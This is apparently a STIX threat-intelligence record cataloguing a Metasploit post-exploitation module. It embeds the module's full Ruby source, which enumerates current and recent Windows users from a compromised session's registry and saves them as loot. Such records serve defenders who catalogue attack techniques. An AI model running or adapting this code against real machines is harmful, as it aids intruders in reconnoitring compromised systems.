{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--66b1e8ed-bf68-4041-80db-c7fa04db19b8",
    "created": "2024-08-14T16:33:05.0514Z",
    "modified": "2024-08-14T16:33:05.051403Z",
    "name": "Windows Gather Logged On User Enumeration (Registry)",
    "description": "This module will enumerate current and recently logged on Windows users. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_logged_on_users.rb",
            "external_id": "enum_logged_on_users.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Accounts\n  include Msf::Post::Windows::Registry\n  include Msf::Post::Windows::UserProfiles\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Logged On User Enumeration (Registry)',\n        'Description' => %q{ This module will enumerate current and recently logged on Windows users. },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => %w[powershell shell meterpreter],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptBool.new('CURRENT', [ true, 'Enumerate currently logged on users', true]),\n      OptBool.new('RECENT', [ true, 'Enumerate recently logged on users', true])\n    ])\n  end\n\n  def list_recently_logged_on_users\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Recently Logged Users',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'SID',\n        'Profile Path'\n      ]\n    )\n\n    profiles = read_profile_list(user_accounts_only: false)\n\n    return if profiles.blank?\n\n    profiles.each do |profile|\n      tbl << [\n        profile['SID'],\n        profile['PROF']\n      ]\n    end\n\n    return if tbl.rows.empty?\n\n    print_line(\"\\n#{tbl}\\n\")\n    p = store_loot('host.users.recent', 'text/plain', session, tbl.to_s, 'recent_users.txt', 'Recent Users')\n    print_good(\"Results saved in: #{p}\")\n  end\n\n  def list_currently_logged_on_users\n    return unless session.type == 'meterpreter'\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Current Logged Users',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'SID',\n        'User'\n      ]\n    )\n    keys = registry_enumkeys('HKU')\n\n    return unless keys\n\n    keys.each do |maybe_sid|\n      next unless maybe_sid.starts_with?('S-1-5-21-')\n      next if maybe_sid.ends_with?('_Classes')\n\n      info = resolve_sid(maybe_sid)\n\n      next if info.nil?\n\n      name = info[:name]\n      domain = info[:domain]\n\n      next if domain.blank? || name.blank?\n\n      tbl << [maybe_sid, \"#{domain}\\\\#{name}\"]\n    end\n\n    return if tbl.rows.empty?\n\n    print_line(\"\\n#{tbl}\\n\")\n    p = store_loot('host.users.active', 'text/plain', session, tbl.to_s, 'active_users.txt', 'Active Users')\n    print_good(\"Results saved in: #{p}\")\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    if datastore['CURRENT']\n      if session.type == 'meterpreter'\n        list_currently_logged_on_users\n      else\n        print_error(\"Incompatible session type '#{session.type}'. Can not retrieve list of currently logged in users.\")\n      end\n    end\n\n    if datastore['RECENT']\n      list_recently_logged_on_users\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}